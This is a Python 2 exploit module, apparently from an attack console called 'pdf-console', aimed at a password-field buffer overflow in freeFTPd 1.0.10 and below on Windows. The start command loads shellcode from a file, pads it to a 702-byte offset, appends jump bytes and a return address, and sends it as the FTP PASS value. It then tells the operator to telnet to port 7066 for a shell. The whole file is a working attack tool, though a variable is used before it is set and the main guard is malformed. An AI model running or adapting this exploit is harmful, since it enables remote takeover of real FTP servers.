class freeftpdPassOverflowMenu(cmd.Cmd):
  def do_show(self, args):
    if args != "options":
      print "*** Unknown argument: " + args
    print "Target: freeFTPd version 1.0.10 and below on Windows"
    print "Options for freeftpd_pass_overflow:"
    print "========================"
    print "user    %s    the user to login in as" % self.user[0]
    print "host    %s    the IP of the target" % self.host[0]
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the freeftpd_pass_overflow context"
  def do_exit(self, args):
    if args:
      print "*** Argument number: needed 0"
      return
    return True
  def help_start(self):
    print "Usage: start"
    print "start: start the attack"
  def do_start(self, args):
    for let in "abcdefghijklmnopqrstuvwxyz":
      if let in self.host[0]:
        self.host[0] = gethostbyname(self.host[0])
    print "[*]Generating payload..."
    off = 702
    f = open("../../../payloads/freeftpd_pass.shell", "r")
    for line in f.readlines():
      payload += line[:-1].decode('string_escape')
    f.close()
    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
    for a in range(0, off - len(payload)):
      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
      payload += tmp.decode('string_escape')
    payload += "\xe9=\xfd\xff\xff"
    payload += "\xeb\xf9"
    for a in range(0, 2):
      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
      payload += tmp.decode('string_escape')
    payload += "\xbb\x14\x40\x00"
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((self.host[0], 21))
    s.recv(1024)
    s.send("USER " + self.user[0])
    s.recv(1024)
    s.send("PASS " + payload)
    s.close()
    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
def main():
  freeftpdpassoverflowmenu = freeftpdPassOverflowMenu()
  freeftpdpassoverflowmenu.cmdloop("pdf-console attack(freeftpd_pass_overflow)% ")
if __name__ == __main__:
  main()
